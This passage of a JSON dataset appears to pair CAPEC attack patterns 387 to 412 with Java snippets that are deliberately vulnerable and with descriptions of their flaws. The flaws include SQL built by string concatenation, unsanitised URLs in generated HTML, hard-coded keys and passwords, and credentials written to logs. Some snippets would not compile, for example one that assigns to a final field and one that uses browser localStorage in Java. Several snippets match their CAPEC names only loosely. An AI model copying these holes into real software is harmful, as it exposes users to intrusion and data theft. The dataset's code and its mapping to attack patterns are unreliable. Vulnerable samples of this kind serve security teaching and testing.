        "code_snippet": "public class NavigationController {\n    private Map<String, String> urlMap = new HashMap<>();\n\n    @PostMapping(\"/update/navigation\")\n    public ResponseEntity<?> updateNavigation(@RequestParam String buttonId, @RequestParam String newUrl) {\n        // No validation of URL origin or authentication\n        urlMap.put(buttonId, newUrl);\n        return ResponseEntity.ok().build();\n    }\n\n    @GetMapping(\"/button/redirect/{buttonId}\")\n    public String handleButtonClick(@PathVariable String buttonId) {\n        // Client-side only validation of URLs\n        String destination = urlMap.get(buttonId);\n        if(destination != null) {\n            // No encryption or URL validation\n            return \"redirect:\" + destination;\n        }\n        return \"redirect:/default\";\n    }\n\n    @GetMapping(\"/get/button-html/{buttonId}\")\n    public String getButtonHtml(@PathVariable String buttonId) {\n        String url = urlMap.get(buttonId);\n        // Generates potentially malicious button HTML without sanitization\n        return \"<button onclick='window.location.href=\\\"\" + url + \"\\\"'>Click Me</button>\";\n    }\n}",
        "description": "This vulnerable code allows unvalidated modification of navigation URLs through a REST API. It demonstrates multiple vulnerabilities including insufficient origin validation, client-side security enforcement, missing data encryption, and modification of assumed-immutable data. The code allows arbitrary URL updates without proper authentication or validation, enabling attackers to inject malicious destinations."
    },
    {
        "capec_id": "387",
        "capec_name": "Navigation Remapping To Propagate Malicious Content",
        "code_snippet": "public class OnlineStore {\n    private static class CartItem {\n        public String productId;\n        public double price;\n        public int quantity;\n    }\n\n    public double calculateTotal(CartItem[] items) {\n        double total = 0;\n        for(CartItem item : items) {\n            // Client sends price in plain text without validation\n            // Assumes client-side data is trustworthy\n            total += item.price * item.quantity;\n        }\n        return total;\n    }\n\n    public void processOrder(String orderData) {\n        // No validation of data origin\n        // No encryption of sensitive data\n        // Relies on client-side price calculation\n        CartItem[] items = deserializeOrderData(orderData);\n        double total = calculateTotal(items);\n        submitOrder(items, total);\n    }\n\n    private void submitOrder(CartItem[] items, double total) {\n        // Process payment and fulfill order\n    }\n\n    private CartItem[] deserializeOrderData(String orderData) {\n        // Convert JSON string to CartItem array\n        return null;\n    }\n}",
        "description": "This vulnerable code demonstrates a server-side implementation that blindly trusts client-provided data, specifically product prices and order details. It lacks proper data origin validation, encryption of sensitive data, and relies on client-side security controls. An attacker could manipulate the price values or order data before submission, bypassing the intended business logic and potentially purchasing items at arbitrary prices."
    },
    {
        "capec_id": "388",
        "capec_name": "Application API Button Hijacking",
        "code_snippet": "public class ButtonManager {\n    private static final String API_ENDPOINT = \"http://api.example.com/buttons\";\n    \n    public static String getButtonDestination(String buttonId) {\n        try {\n            // Retrieve button configuration from client-side storage\n            String buttonConfig = localStorage.getItem(\"button_\" + buttonId);\n            JSONObject config = new JSONObject(buttonConfig);\n            \n            // No validation of button destination URL\n            String destination = config.getString(\"destination\");\n            \n            // No origin verification or encryption\n            return destination;\n        } catch (Exception e) {\n            return \"default.html\";\n        }\n    }\n    \n    public static void updateButtonConfig(String buttonId, String newDestination) {\n        try {\n            // Directly update client-side storage without server verification\n            JSONObject config = new JSONObject();\n            config.put(\"destination\", newDestination);\n            localStorage.setItem(\"button_\" + buttonId, config.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a button management system that stores button configurations client-side without proper validation, encryption, or server-side verification. It allows attackers to modify button destinations by manipulating local storage data, lacks origin validation, and relies solely on client-side enforcement of security measures."
    },
    {
        "capec_id": "389",
        "capec_name": "Content Spoofing Via Application API Manipulation",
        "code_snippet": "public class ClientAuthenticationSystem {\n    private String sessionToken;\n    \n    public boolean authenticateUser(String username, String password) {\n        // Client-side only authentication\n        if(isValidCredentials(username, password)) {\n            sessionToken = generateToken(username);\n            return true;\n        }\n        return false;\n    }\n    \n    public boolean sendMessage(String message) {\n        // No integrity check for message transmission\n        String url = \"http://server.com/api/messages\";\n        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();\n        conn.setRequestMethod(\"POST\");\n        conn.setRequestProperty(\"Authorization\", sessionToken);\n        \n        // Send message without validation or encryption\n        OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());\n        writer.write(message);\n        writer.close();\n        \n        return conn.getResponseCode() == 200;\n    }\n    \n    private boolean isValidCredentials(String username, String password) {\n        // Client-side credential validation\n        return username != null && password.length() >= 6;\n    }\n    \n    private String generateToken(String username) {\n        // Generate simple token without server validation\n        return username + \"_\" + System.currentTimeMillis();\n    }\n}",
        "description": "This vulnerable code demonstrates client-side authentication and message transmission without proper server-side validation or integrity checks. It allows for authentication bypass through token spoofing and message manipulation during transmission. The code lacks server-side security controls and message integrity verification, making it susceptible to capture-replay attacks and content spoofing."
    },
    {
        "capec_id": "390",
        "capec_name": "Bypassing Physical Security",
        "code_snippet": "public class SecuritySystem {\n    private static final int VOLTAGE_THRESHOLD = 5;\n    private boolean alarmActive = true;\n    private int currentVoltage = 0;\n\n    public boolean validateAccess(String cardId) {\n        // No voltage glitch detection before validation\n        if(currentVoltage > 0) {\n            return true;\n        }\n\n        try {\n            // Basic card validation without EMI protection\n            Thread.sleep(100);\n            if(cardId != null && cardId.length() > 0) {\n                logAccessAttempt(\"Access granted for card: \" + cardId);\n                return true;\n            }\n        } catch(InterruptedException e) {\n            // Clock glitch might cause this - but we ignore it\n            return true;\n        }\n        return false;\n    }\n\n    public void handleAlert(String alertType) {\n        // Vulnerable to alert suppression\n        if(alarmActive) {\n            System.out.println(\"ALERT: \" + alertType);\n        }\n    }\n\n    private void logAccessAttempt(String message) {\n        // Leaks timing information through logging\n        System.out.println(System.currentTimeMillis() + \": \" + message);\n    }\n}",
        "description": "This code represents a vulnerable physical security system implementation that's susceptible to various side-channel attacks, voltage glitching, and electromagnetic fault injection. It lacks proper protection mechanisms for physical access control, doesn't properly handle voltage/clock glitches, and can have its alert system disabled. The code also leaks timing information through logging and doesn't implement proper EMI protection measures."
    },
    {
        "capec_id": "391",
        "capec_name": "Bypassing Physical Locks",
        "code_snippet": "public class PhysicalSecuritySystem {\n    private static boolean lockEngaged = false;\n    private static boolean debugMode = false;\n    \n    public static void setLock(boolean lock) {\n        // No authentication check for lock modification\n        lockEngaged = lock;\n    }\n    \n    public static void enableDebugMode() {\n        // Debug mode can be enabled externally without restrictions\n        debugMode = true;\n        lockEngaged = false;  // Debug mode bypasses lock\n    }\n    \n    public static boolean accessSecureArea(String area) {\n        if (debugMode) {\n            return true;  // Debug mode grants full access\n        }\n        \n        // Single lock controls access to all areas\n        // No granular control per area\n        return !lockEngaged;\n    }\n    \n    public static void modifySystemRegisters(int address, int value) {\n        // Lock bit can be modified after being set\n        if (!lockEngaged || debugMode) {\n            // Modify system registers without proper validation\n            writeToRegister(address, value);\n        }\n    }\n    \n    private static void writeToRegister(int address, int value) {\n        // Implementation of register writing\n    }\n}",
        "description": "This code demonstrates multiple physical security vulnerabilities including insufficient lock protection, external lock control, debug mode bypass, and lack of granular access control. The system allows unauthorized modification of lock states, uses a single lock for all areas, and contains a debug mode that can override security controls."
    },
    {
        "capec_id": "392",
        "capec_name": "Lock Bumping",
        "code_snippet": "public class SecurityLockSystem {\n    private static final byte[] MASTER_KEY = {0x12, 0x34, 0x56, 0x78}; // Hard-coded key\n    private boolean isLocked = true;\n    private int lockBit = 1;\n    private int failedAttempts = 0;\n\n    public boolean unlock(byte[] key) {\n        // Lock bit can be modified even after being set\n        if (isPowerStateTransition()) {\n            lockBit = 0; // Lock protection disabled during power transition\n        }\n\n        if (failedAttempts >= 3) {\n            lockoutAccount(); // Overly restrictive lockout\n            return false;\n        }\n\n        // Vulnerable timing-based comparison\n        boolean match = true;\n        for (int i = 0; i < key.length; i++) {\n            if (i < MASTER_KEY.length && key[i] != MASTER_KEY[i]) {\n                match = false;\n                Thread.sleep(5); // Timing leak\n            }\n        }\n\n        if (!match) {\n            failedAttempts++;\n            return false;\n        }\n\n        isLocked = false;\n        return true;\n    }\n\n    private boolean isPowerStateTransition() {\n        // Simplified power state check\n        return System.currentTimeMillis() % 2 == 0;\n    }\n\n    private void lockoutAccount() {\n        // Account locked for 24 hours without recovery option\n        isLocked = true;\n        failedAttempts = 0;\n    }\n}",
        "description": "This code represents a vulnerable electronic lock system that mimics physical lock bumping through software vulnerabilities. It includes hard-coded cryptographic keys, improper lock bit protection that can be bypassed during power transitions, and an overly restrictive lockout mechanism. The timing-based comparison creates a side-channel vulnerability similar to how lock bumping exploits mechanical lock timing."
    },
    {
        "capec_id": "393",
        "capec_name": "Lock Picking",
        "code_snippet": "public class SecurityLock {\n    private static volatile boolean isLocked = false;\n    private static int lockBit = 0;\n    \n    public static void setLockBit(int value) {\n        // CWE-1231: Lock bit can be modified after being set\n        lockBit = value;\n    }\n    \n    public static synchronized void lock() {\n        // CWE-412: Lock can be externally controlled\n        if(!isLocked) {\n            isLocked = true;\n        }\n    }\n    \n    public static void unlock() {\n        // CWE-832: No check if lock is actually locked\n        isLocked = false;\n    }\n    \n    public static boolean accessProtectedRegion(int address) {\n        // CWE-1222: Insufficient granularity of protected regions\n        if(address >= 0x1000 && address <= 0xFFFF) {\n            return lockBit == 1;\n        }\n        return true;\n    }\n    \n    public void processRequest() {\n        // CWE-833: Potential deadlock scenario\n        Thread t1 = new Thread(() -> {\n            synchronized(this) {\n                lock();\n                accessProtectedRegion(0x1234);\n            }\n        });\n        \n        Thread t2 = new Thread(() -> {\n            synchronized(this) {\n                lock();\n                accessProtectedRegion(0x5678);\n            }\n        });\n        \n        t1.start();\n        t2.start();\n    }\n}",
        "description": "This vulnerable code implements a security lock mechanism that mimics a physical lock system, but contains multiple security flaws: modifiable lock bits, insufficient access controls, improper locking mechanisms, and potential deadlocks. The code allows unauthorized modification of lock states and contains race conditions, similar to how a physical lock can be manipulated through lock picking."
    },
    {
        "capec_id": "394",
        "capec_name": "Using a Snap Gun Lock to Force a Lock",
        "code_snippet": "public class LockManager {\n    private static boolean isLocked = false;\n    private static final String DEFAULT_KEY = \"0000\";\n    private volatile boolean powerSaveMode = false;\n\n    public synchronized void lock(String key) {\n        if (key.equals(DEFAULT_KEY)) {\n            isLocked = true;\n            System.out.println(\"Lock engaged\");\n        }\n    }\n\n    public synchronized void unlock(String key) {\n        if (powerSaveMode) {\n            isLocked = false;  // Lock state reset during power transition\n            return;\n        }\n\n        if (key.equals(DEFAULT_KEY)) {\n            isLocked = false;\n            System.out.println(\"Lock disengaged\");\n        }\n    }\n\n    public void enterPowerSaveMode() {\n        powerSaveMode = true;\n        // Lock state becomes vulnerable during power transition\n    }\n\n    public void exitPowerSaveMode() {\n        powerSaveMode = false;\n        // Lock state might not be properly restored\n    }\n}",
        "description": "This code demonstrates a vulnerable electronic lock implementation that uses a default key and has improper lock behavior during power state transitions. The lock can be bypassed during power save mode, and the lock state can be manipulated due to improper synchronization and state management. The use of a default key and poor state handling during power transitions makes it susceptible to unauthorized access."
    },
    {
        "capec_id": "395",
        "capec_name": "Bypassing Electronic Locks and Access Controls",
        "code_snippet": "public class RFIDAccessControl {\n    private static final String MASTER_KEY = \"0xA55AF00D1234\";  // Hard-coded key\n    \n    public boolean validateCard(String cardData) {\n        // Simple XOR encryption with fixed key\n        String encryptedData = simpleEncrypt(cardData, MASTER_KEY);\n        \n        // Validate card data without timing attack protection\n        if(encryptedData.equals(getStoredHash())) {\n            return true;\n        }\n        return false;\n    }\n    \n    private String simpleEncrypt(String data, String key) {\n        // Weak encryption using XOR\n        StringBuilder result = new StringBuilder();\n        for(int i = 0; i < data.length(); i++) {\n            result.append((char)(data.charAt(i) ^ key.charAt(i % key.length())));\n        }\n        return result.toString();\n    }\n    \n    private String getStoredHash() {\n        // Stored hash directly in code without protection\n        return \"ValidCardHash123\";\n    }\n}",
        "description": "This vulnerable code implements an RFID access control system with multiple security flaws: it uses a hard-coded cryptographic key, implements a weak XOR encryption algorithm, lacks protection against timing attacks and electromagnetic side-channel analysis, and stores sensitive validation data directly in the code. The implementation is susceptible to reverse engineering and card cloning attacks."
    },
    {
        "capec_id": "396",
        "capec_name": "DEPRECATED: Bypassing Card or Badge-Based Systems",
        "code_snippet": "public class CardAuthenticator {\n    private static final String ENCRYPTION_KEY = \"fixed_key_123\";\n\n    public boolean validateCard(String cardData) {\n        // Using weak encryption\n        String encryptedData = SimpleEncrypt(cardData);\n        \n        // Store last transaction data in memory\n        String lastTransaction = encryptedData;\n        \n        // No timestamp or nonce validation\n        return checkDatabase(encryptedData);\n    }\n\n    private String SimpleEncrypt(String data) {\n        // Using static XOR encryption\n        byte[] result = data.getBytes();\n        for(int i = 0; i < result.length; i++) {\n            result[i] = (byte)(result[i] ^ ENCRYPTION_KEY.charAt(i % ENCRYPTION_KEY.length()));\n        }\n        return new String(result);\n    }\n\n    private boolean checkDatabase(String data) {\n        // Vulnerable to replay attacks - no session validation\n        return true;\n    }\n}",
        "description": "This code demonstrates multiple authentication vulnerabilities related to card-based authentication systems. It uses weak encryption with a fixed key, lacks protection against replay attacks, and implements no proper validation mechanisms. The authentication can be bypassed through capture-replay attacks, and the stored data is not properly protected from modification."
    },
    {
        "capec_id": "397",
        "capec_name": "Cloning Magnetic Strip Cards",
        "code_snippet": "public class MagneticCardData implements Cloneable {\n    private String cardNumber;\n    private String encryptedData;\n    private static final String ENCRYPTION_KEY = \"statickey123\";\n\n    public MagneticCardData(String cardNumber, String data) {\n        this.cardNumber = cardNumber;\n        // Using weak encryption\n        this.encryptedData = SimpleEncrypt(data, ENCRYPTION_KEY);\n    }\n\n    @Override\n    public Object clone() throws CloneNotSupportedException {\n        return super.clone();\n    }\n\n    private String SimpleEncrypt(String data, String key) {\n        // Weak XOR encryption\n        StringBuilder result = new StringBuilder();\n        for(int i = 0; i < data.length(); i++) {\n            result.append((char)(data.charAt(i) ^ key.charAt(i % key.length())));\n        }\n        return result.toString();\n    }\n\n    public String getCardNumber() { return cardNumber; }\n    public String getEncryptedData() { return encryptedData; }\n}",
        "description": "This code demonstrates a vulnerable implementation of a magnetic card data storage class that can be easily cloned. It uses weak encryption (simple XOR) with a static key, and implements the Cloneable interface which allows unauthorized duplication of sensitive card data. The class fails to protect against data mirroring and provides no safeguards against unauthorized copying, making it susceptible to card cloning attacks."
    },
    {
        "capec_id": "398",
        "capec_name": "Magnetic Strip Card Brute Force Attacks",
        "code_snippet": "public class MagneticCardProcessor {\n    private static final String MASTER_KEY = \"abc123xyz789\";  // Hard-coded crypto key\n    private int failedAttempts = 0;\n    \n    public boolean validateCard(String cardData) {\n        // Using weak encryption\n        String encryptedData = DESEncryption.encrypt(cardData, MASTER_KEY);\n        \n        // No rate limiting on validation attempts\n        if(isValidCardFormat(cardData)) {\n            failedAttempts = 0;\n            return true;\n        }\n        \n        // Simple card validation without proper cryptographic verification\n        if(cardData.length() == 16 && cardData.matches(\"[0-9]+\")) {\n            return true;\n        }\n        \n        // Basic magnetic stripe data validation\n        String track2Data = extractTrack2Data(cardData);\n        if(track2Data != null) {\n            // No protection against spoofing or cloning\n            return checkLuhnAlgorithm(track2Data);\n        }\n        return false;\n    }\n    \n    private boolean isValidCardFormat(String data) {\n        // Weak validation logic susceptible to spoofing\n        return data != null && data.length() > 0;\n    }\n}",
        "description": "This vulnerable code demonstrates weak magnetic card processing with multiple security issues: hard-coded cryptographic keys, weak DES encryption, no rate limiting for authentication attempts, insufficient validation against card cloning/spoofing, and lack of protection against electromagnetic tampering. The validation logic is simplistic and can be easily bypassed."
    },
    {
        "capec_id": "399",
        "capec_name": "Cloning RFID Cards or Chips",
        "code_snippet": "public class RFIDAccessControl {\n    private static Map<String, Boolean> accessGranted = new HashMap<>();\n\n    public static void processRFIDSignal(String rfidTag) {\n        // Weak implementation allowing duplicate IDs\n        String decodedId = decodeRFIDSignal(rfidTag);\n        \n        // No validation of signal authenticity\n        if (accessGranted.containsKey(decodedId)) {\n            grantAccess(decodedId);\n        }\n    }\n\n    private static String decodeRFIDSignal(String signal) {\n        // Simple decoder without security checks\n        return signal.substring(0, 8);\n    }\n\n    private static void grantAccess(String id) {\n        // No protection against cloned or replayed signals\n        System.out.println(\"Access granted for ID: \" + id);\n        openDoor();\n    }\n\n    private static void openDoor() {\n        // Physical access control\n        System.out.println(\"Door opened\");\n    }\n}",
        "description": "This vulnerable code implements an RFID access control system that lacks proper security measures against cloning and replay attacks. It has weak signal decoding, no validation of signal authenticity, and allows duplicate IDs to be processed. The system doesn't implement protection against electromagnetic interference or unique identifier verification, making it susceptible to cloning attacks and unauthorized access."
    },
    {
        "capec_id": "400",
        "capec_name": "RFID Chip Deactivation or Destruction",
        "code_snippet": "public class RFIDController {\n    private static final String DEBUG_PASSWORD = \"admin123\";\n    private boolean isTestMode = false;\n\n    public void processRFIDTag(String tagId) {\n        if (isTestMode) {\n            // Debug interface accessible without proper authentication\n            enterTestMode(DEBUG_PASSWORD);\n        }\n\n        try {\n            // Vulnerable decoding of security identifiers\n            int securityLevel = Integer.parseInt(tagId.substring(0, 2), 16);\n            \n            // No validation of input signals or error handling\n            if (tagId.contains(\"DEACTIVATE\")) {\n                deactivateTag(tagId);\n            }\n\n            // Improper alert handling for unauthorized access\n            if (isTagCompromised(tagId)) {\n                // Alert message can be suppressed by malicious input\n                System.out.println(\"Tag compromised: \" + tagId);\n            }\n        } catch (Exception e) {\n            // Sensitive error messages exposed\n            e.printStackTrace();\n        }\n    }\n\n    private void deactivateTag(String tagId) {\n        // No proper verification for deactivation requests\n        // Missing access control for tag deactivation\n        writeToTag(tagId, \"DISABLED\");\n    }\n\n    private void enterTestMode(String password) {\n        // Weak protection of debug interface\n        if (password.equals(DEBUG_PASSWORD)) {\n            enableTestRegisters();\n        }\n    }\n\n    private void writeToTag(String tagId, String data) {\n        // Direct writing to tag without proper authorization\n    }\n\n    private boolean isTagCompromised(String tagId) {\n        return tagId.startsWith(\"FF\");\n    }\n\n    private void enableTestRegisters() {\n        // Exposes internal test functionality\n    }\n}",
        "description": "This vulnerable code demonstrates an RFID control system with multiple security flaws that allow for unauthorized tag deactivation. It includes weak debug interface protection, improper access control for tag operations, vulnerable security identifier decoding, and insufficient error handling. The code allows direct manipulation of RFID tags without proper authentication and exposes sensitive debug functionality."
    },
    {
        "capec_id": "401",
        "capec_name": "Physically Hacking Hardware",
        "code_snippet": "public class HardwareController {\n    private static final String ADMIN_PASSWORD = \"admin123\";\n    private boolean debugMode = false;\n\n    public void accessHardware(String password) {\n        if(password.equals(ADMIN_PASSWORD)) {\n            debugMode = true;\n            modifyHardwareRegisters();\n        }\n    }\n\n    private void modifyHardwareRegisters() {\n        if(debugMode) {\n            // Direct hardware access without checks\n            int baseAddress = 0xF000;\n            writeToRegister(baseAddress, 0xFF);\n            adjustClockFrequency(100);\n            modifyVoltageLevel(3.3f);\n        }\n    }\n\n    private native void writeToRegister(int address, int value);\n    private native void adjustClockFrequency(int mhz);\n    private native void modifyVoltageLevel(float voltage);\n}",
        "description": "This vulnerable code demonstrates weak hardware access control by using a hardcoded password, enabling debug mode at runtime, and allowing direct manipulation of hardware registers, clock frequencies, and voltage levels without proper protection mechanisms. The code lacks physical access restrictions, voltage/clock glitch detection, and protection against side-channel attacks. The native methods provide unrestricted access to hardware features without proper validation or monitoring."
    },
    {
        "capec_id": "402",
        "capec_name": "Bypassing ATA Password Security",
        "code_snippet": "public class ATADriveManager {\n    private static final String MASTER_PASSWORD = \"admin123\";\n    private boolean isLocked = true;\n\n    public boolean unlockDrive(String password) {\n        // No check for prior BIOS authentication\n        if (password.equals(MASTER_PASSWORD)) {\n            isLocked = false;\n            return true;\n        }\n        return false;\n    }\n\n    public boolean updateDrivePassword(String newPassword) {\n        // Missing authentication check before allowing password update\n        // No verification of BIOS-level authentication\n        MASTER_PASSWORD = newPassword;\n        return true;\n    }\n\n    public byte[] readDriveContents() {\n        // No granular access control\n        // No verification of lock state\n        return getDriveData();\n    }\n\n    private byte[] getDriveData() {\n        // Implementation to read drive data\n        return new byte[1024];\n    }\n}",
        "description": "This code demonstrates vulnerable ATA drive security implementation with hardcoded credentials, missing authentication checks, and insufficient access controls. It allows password updates without proper authorization and lacks verification of BIOS-level authentication, making it susceptible to unauthorized access through drive hot-swapping attacks."
    },
    {
        "capec_id": "404",
        "capec_name": "DEPRECATED: Social Information Gathering Attacks",
        "code_snippet": "public class InsecureDataHandler {\n    private static String authenticationKey;\n    private static final String LOG_FILE = \"/var/log/app.log\";\n    \n    public boolean authenticateUser(String username) {\n        try {\n            // Insecure reliance on DNS lookup for authentication\n            InetAddress addr = InetAddress.getByName(username + \".trusted-domain.com\");\n            String hostAddress = addr.getHostAddress();\n            \n            // Log sensitive information\n            FileWriter fw = new FileWriter(LOG_FILE, true);\n            fw.write(\"Auth attempt: \" + username + \", key: \" + authenticationKey + \"\\n\");\n            fw.close();\n            \n            // Store sensitive data without encryption\n            authenticationKey = username + hostAddress;\n            \n            return hostAddress != null;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple deprecated security issues including insecure DNS-based authentication, improper storage of sensitive data, authentication bypass vulnerabilities, and exposure of sensitive information through log files. The code relies on DNS lookups for security decisions, stores authentication data without protection, and logs sensitive information in plain text."
    },
    {
        "capec_id": "405",
        "capec_name": "DEPRECATED: Social Information Gathering via Research",
        "code_snippet": "public class UnsecureAuthenticator {\n    private String logFilePath = \"/var/log/app.log\";\n    private Map<String, String> userCredentials = new HashMap<>();\n\n    public boolean authenticateUser(String username, String password) {\n        // Log authentication attempt\n        try {\n            FileWriter fw = new FileWriter(logFilePath, true);\n            fw.write(\"Auth attempt - User: \" + username + \", Pass: \" + password + \"\\n\");\n            fw.close();\n        } catch (IOException e) {}\n\n        // Insecure DNS-based authentication\n        try {\n            InetAddress.getByName(username + \".trusted-domain.com\");\n            return true;\n        } catch (UnknownHostException e) {\n            return false;\n        }\n    }\n\n    public void storeUserData(String username, String sensitiveData) {\n        // Store unencrypted sensitive data\n        userCredentials.put(username, sensitiveData);\n        \n        // Write to publicly accessible file\n        try {\n            FileWriter fw = new FileWriter(\"/public/users/\" + username + \".dat\");\n            fw.write(sensitiveData);\n            fw.close();\n        } catch (IOException e) {}\n    }\n}",
        "description": "This code demonstrates multiple deprecated security vulnerabilities including: reliance on DNS lookups for authentication decisions, exposing sensitive information in server logs, failure to protect stored data through proper encryption, and insecure authentication mechanisms. The code logs sensitive credentials, uses DNS for authentication, and stores unencrypted sensitive data in publicly accessible locations."
    },
    {
        "capec_id": "406",
        "capec_name": "Dumpster Diving",
        "code_snippet": "public class DataManager {\n    private static final String TEMP_DIR = \"/tmp/\";\n    private static final String LOG_FILE = \"app.log\";\n    \n    public void processUserData(String userId, String creditCard, String ssn) {\n        // Store sensitive data in cleartext temporary files\n        try {\n            FileWriter fw = new FileWriter(TEMP_DIR + userId + \"_data.txt\");\n            fw.write(\"Credit Card: \" + creditCard + \"\\n\");\n            fw.write(\"SSN: \" + ssn + \"\\n\");\n            fw.close();\n            \n            // Log sensitive information in cleartext\n            Logger.getLogger(\"app\").info(\"Processing user \" + userId + \" with CC: \" + creditCard);\n            \n            // Store sensitive data in memory without encryption\n            String[] userData = {userId, creditCard, ssn};\n            \n            // Improper cleanup of temp files\n            File tempFile = new File(TEMP_DIR + userId + \"_data.txt\");\n            tempFile.delete(); // Simple deletion without secure wiping\n            \n            // Version control files exposed\n            copyToDirectory(new File(\".git\"), new File(TEMP_DIR));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates improper handling of sensitive data through multiple vectors: storing sensitive information in cleartext temporary files, logging sensitive data in plaintext, keeping unencrypted data in memory, improper cleanup of temporary files, and exposing version control repositories. The code lacks secure data disposal methods and proper access controls, making it susceptible to dumpster diving attacks where an attacker could recover sensitive information from various sources including temporary files, logs, and improperly deleted data."
    },
    {
        "capec_id": "407",
        "capec_name": "Pretexting",
        "code_snippet": "public class UserSessionManager {\n    private static Map<String, String> sessions = new HashMap<>();\n\n    public static String authenticateUser(String sessionId, String username, String password) {\n        // Vulnerable: Does not invalidate existing sessions (CWE-384)\n        if(sessions.containsKey(sessionId)) {\n            return sessionId;\n        }\n\n        // Vulnerable: No proper verification of user identity (CWE-300)\n        if(password != null) {\n            sessions.put(sessionId, username);\n            return sessionId;\n        }\n        return null;\n    }\n\n    public static boolean displaySensitiveInfo(String sessionId) {\n        // Vulnerable: UI misrepresentation (CWE-451)\n        String userInfo = sessions.get(sessionId);\n        if(userInfo != null) {\n            // Vulnerable: Exposure of sensitive data (CWE-200)\n            System.out.println(\"Secure Connection: \" + userInfo);\n            System.out.println(\"Account Details: \" + getUserDetails(userInfo));\n            return true;\n        }\n        return false;\n    }\n\n    private static String getUserDetails(String username) {\n        // Vulnerable: Creates emergent resource (CWE-1229)\n        return \"User: \" + username + \", SSN: 123-45-6789, Account: 987654321\";\n    }\n}",
        "description": "This code demonstrates a vulnerable session management system that enables social engineering through pretexting. It allows session fixation, lacks proper identity verification, misrepresents security status in UI, exposes sensitive information, and creates emergent resources that could be exploited by attackers impersonating legitimate users."
    },
    {
        "capec_id": "408",
        "capec_name": "DEPRECATED: Information Gathering from Traditional Sources",
        "code_snippet": "public class InsecureDataHandler {\n    private static final Logger logger = Logger.getLogger(\"debug.log\");\n    \n    public boolean authenticateUser(String username) {\n        try {\n            // Insecure reliance on DNS for security decision\n            InetAddress addr = InetAddress.getByName(username + \".trusted-domain.com\");\n            \n            // Debug logging exposing sensitive information\n            logger.debug(\"Authentication attempt - User: \" + username + \", Password hash: \" + getPasswordHash(username));\n            \n            // Storing sensitive data without protection\n            FileWriter fw = new FileWriter(\"user_data.txt\", true);\n            fw.write(username + \":\" + getPasswordHash(username) + \"\\n\");\n            fw.close();\n            \n            return addr != null;\n        } catch (Exception e) {\n            logger.error(\"Authentication failed: \" + e.getMessage());\n            return false;\n        }\n    }\n    \n    private String getPasswordHash(String username) {\n        return \"hash_\" + username; // Simplified for example\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues: reliance on DNS lookups for security decisions, exposure of sensitive information through debug logs, and improper protection of stored data. The code performs DNS-based authentication, logs sensitive information including password hashes, and stores user data in plaintext files without proper access controls or encryption."
    },
    {
        "capec_id": "409",
        "capec_name": "DEPRECATED: Information Gathering from Non-Traditional Sources",
        "code_snippet": "public class SecurityDecision {\n    private String userRole;\n    private static final String LOG_FILE = \"/var/log/app/debug.log\";\n    \n    public boolean hasAdminAccess(String username) {\n        try {\n            // Vulnerable: Using DNS lookup for security decision\n            InetAddress addr = InetAddress.getByName(username + \".trusted-domain.com\");\n            \n            // Vulnerable: Storing sensitive data in debug logs\n            FileWriter fw = new FileWriter(LOG_FILE, true);\n            fw.write(\"User access attempt: \" + username + \", IP: \" + addr.getHostAddress() + \", Role: \" + userRole);\n            fw.close();\n            \n            // Vulnerable: Unprotected stored data\n            File roleFile = new File(\"/tmp/user_roles.txt\");\n            BufferedReader reader = new BufferedReader(new FileReader(roleFile));\n            userRole = reader.readLine();\n            reader.close();\n            \n            return addr != null && userRole.equals(\"admin\");\n        } catch(Exception e) {\n            return false;\n        }\n    }\n}",
        "description": "This code demonstrates multiple deprecated security vulnerabilities including reliance on DNS lookups for security decisions, unprotected storage of sensitive data, and exposure of sensitive information through debug logs. The code makes security decisions based on DNS lookups, stores unprotected user role data, and logs sensitive information without proper controls."
    },
    {
        "capec_id": "410",
        "capec_name": "Information Elicitation",
        "code_snippet": "public class EmployeeDirectory {\n    private Map<String, Employee> employees = new HashMap<>();\n\n    public String getEmployeeInfo(String email, String query) {\n        if (query.toLowerCase().contains(\"salary\") || query.toLowerCase().contains(\"ssn\")) {\n            // No authentication check performed\n            Employee emp = employees.get(email);\n            if (emp != null) {\n                if (query.length() > 50) {\n                    return query.substring(0, 50) + \"...\"; // Truncates potentially sensitive data\n                }\n                return emp.getSensitiveInfo(query);\n            } else {\n                try {\n                    Thread.sleep(2000); // Observable timing difference for existing vs non-existing employees\n                    return \"Employee not found\";\n                } catch (InterruptedException e) {\n                    return \"Error processing request\";\n                }\n            }\n        }\n        return \"Query not supported\";\n    }\n}",
        "description": "This vulnerable code demonstrates social engineering susceptibility by exposing an employee directory that lacks proper authentication and reveals system behavior through timing differences. It truncates security-relevant information, exposes sensitive data without proper authorization, and fails to verify the source of requests. The observable timing differences can be used to determine valid employee emails, aiding in social engineering attacks."
    },
    {
        "capec_id": "411",
        "capec_name": "DEPRECATED: Pretexting",
        "code_snippet": "public class UserAuthenticationSystem {\n    private static final Logger LOG = Logger.getLogger(UserAuthenticationSystem.class);\n\n    public boolean authenticateUser(String username, String password) {\n        // Vulnerable logging of sensitive information\n        LOG.info(\"Login attempt - Username: \" + username + \", Password: \" + password);\n\n        try {\n            String query = \"SELECT * FROM users WHERE username='\" + username + \"' AND password='\" + password + \"'\";\n            // Execute query and authenticate\n            \n            // Debug information exposed in log files\n            LOG.debug(\"Query executed: \" + query);\n            LOG.debug(\"User session token: \" + generateSessionToken());\n            \n            return true;\n        } catch (Exception e) {\n            // Cleanup logs still contain sensitive data\n            LOG.error(\"Authentication failed for user: \" + username + \" with password: \" + password);\n            return false;\n        }\n    }\n\n    private String generateSessionToken() {\n        return \"session_\" + System.currentTimeMillis();\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities related to information exposure through various log files (CWE-532, 533, 534, 542) and authentication bypass issues (CWE-592). The code logs sensitive information including usernames, passwords, and session tokens in different log levels (info, debug, error) without proper protection, making it vulnerable to information gathering attacks. It also uses unsafe SQL query construction that could lead to authentication bypass."
    },
    {
        "capec_id": "412",
        "capec_name": "Pretexting via Customer Service",
